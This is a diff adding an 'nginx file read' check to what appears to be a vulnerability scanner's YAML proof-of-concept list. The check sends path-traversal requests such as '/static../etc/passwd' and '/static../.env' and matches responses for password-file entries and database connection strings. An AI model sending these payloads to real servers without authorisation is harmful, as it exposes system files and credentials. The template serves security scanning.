@@ -1405,3 +1405,66 @@ pocs:
               - 'application/octet-stream'
               - 'filename="heapdump'
             condition: "or"
+  - id: "nginx-file-read"
+    name: "nginx file read"
+    requests:
+      - method: "GET"
+        path: '/static../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x:'
+            condition: "or"
+      - method: "GET"
+        path: '/assets../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x:'
+            condition: "or"
+      - method: "GET"
+        path: '/static../.env'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'postgres://'
+              - 'mysql://'
+              - 'DB_HOST'
+              - 'REDIS_HOST'
+            condition: "or"
+      - method: "GET"
+        path: '/static../config.ini'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'postgres://'
+              - 'mysql://'
+              - 'DB_HOST'
+              - 'REDIS_HOST'
+            condition: "or"
+      - method: "GET"
+        path: '/static../config.php'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'postgres://'
+              - 'mysql://'
+              - 'DB_HOST'
+              - 'REDIS_HOST'
+            condition: "or"
+      - method: "GET"
+        path: '/static../config.yaml'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'postgres://'
+              - 'mysql://'
+              - 'DB_HOST'
+              - 'REDIS_HOST'
+            condition: "or"
